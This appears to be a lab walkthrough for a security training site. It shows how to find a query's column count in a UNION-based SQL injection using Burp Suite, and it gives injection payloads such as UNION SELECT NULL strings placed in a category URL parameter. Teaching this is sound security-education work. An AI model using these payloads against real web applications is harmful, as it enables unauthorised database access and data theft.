# Objective

Injected query **must return the same number of columns** as the application's original SQL query.If the column count doesn't match, the database returns an error.

---

# Step 1: Intercept the Request

Open **Burp Suite**.

1. Turn **Intercept ON**.
2. Browse to the vulnerable application.
3. Select any product category (for example, **Tech gifts**).
4. Burp captures a request similar to:

```
GET /filter?category=Tech+gifts HTTP/2
Host: lab-id.web-security-academy.net
```

Send it to **Repeater** (`Ctrl + R`).

---

# Step 2: Test with One Column

Modify the parameter:

```sql
'+UNION+SELECT+NULL--
```

The SQL executed becomes similar to:

```sql
SELECT name, description
FROM products
WHERE category='Tech gifts'

UNION

SELECT NULL
```

---

<img width="1277" height="719" alt="Screenshot 2026-08-05 at 11 30 58 AM" src="https://github.com/user-attachments/assets/d622b799-d600-4ffb-b3af-41e5b8d64887" />


## Why does an error occur?

Suppose the original query returns **2 columns**:

```sql
SELECT name, description
```

Your injected query returns only **1 column**:

```sql
SELECT NULL
```

The number of columns doesn't match.

Oracle (and other databases) rejects the query.

Typical error:

```
ORA-01789:
query block has incorrect number of result columns
```

---

# Step 3: Try Two Columns

Modify the payload:

```sql
'+UNION+SELECT+NULL,NULL--
```

The SQL becomes:

```sql
SELECT name, description
FROM products
WHERE category='Tech gifts'

UNION

SELECT NULL, NULL
```

Now:

Original query:

```
2 columns
```

Injected query:

```
2 columns
```

The column count matches.

If the original query really returns two columns, the error disappears and the page responds normally (sometimes with extra blank rows because `NULL` values are returned).

<img width="1276" height="716" alt="Screenshot 2026-08-05 at 11 34 53 AM" src="https://github.com/user-attachments/assets/4be26fbb-4f42-48ca-a14a-4bdcb02d81dc" />

---

# Step 4: If It Still Errors

Try adding another `NULL`:

```sql
'+UNION+SELECT+NULL,NULL,NULL--
```

This returns:

```
3 columns
```

If the original query has only two columns, you'll still get an error.

Continue increasing the number of `NULL` values:

```sql
'+UNION+SELECT+NULL,NULL,NULL,NULL--
```

```sql
'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL--
```

Keep testing until the error disappears.

The first payload that works tells you the **exact number of columns** in the original query.

---

<img width="1276" height="733" alt="Screenshot 2026-08-05 at 11 36 09 AM" src="https://github.com/user-attachments/assets/dc603d4c-0f89-4388-b3ec-b627321c885a" />

<img width="1278" height="656" alt="Screenshot 2026-08-05 at 11 37 39 AM" src="https://github.com/user-attachments/assets/061509b6-34e2-4d2b-b056-934b27c2f351" />

# Example Walkthrough

Suppose the original query is:

```sql
SELECT name, description
FROM products
WHERE category='Tech gifts'
```

### Test 1

```sql
UNION SELECT NULL
```

Result:

❌ Error (1 column vs. 2 columns)

---

### Test 2

```sql
UNION SELECT NULL, NULL
```

Result:

✅ Success (2 columns vs. 2 columns)

You now know the original query returns **2 columns**.

---

# Why Use `NULL`?

`NULL` is used because:

- It acts as a placeholder value.
- It can usually be converted to any data type by the database.
- It minimizes data type mismatch errors.
- You don't care about the values yet—you only care about matching the query structure.

That's why `NULL` is the standard choice during this discovery phase.

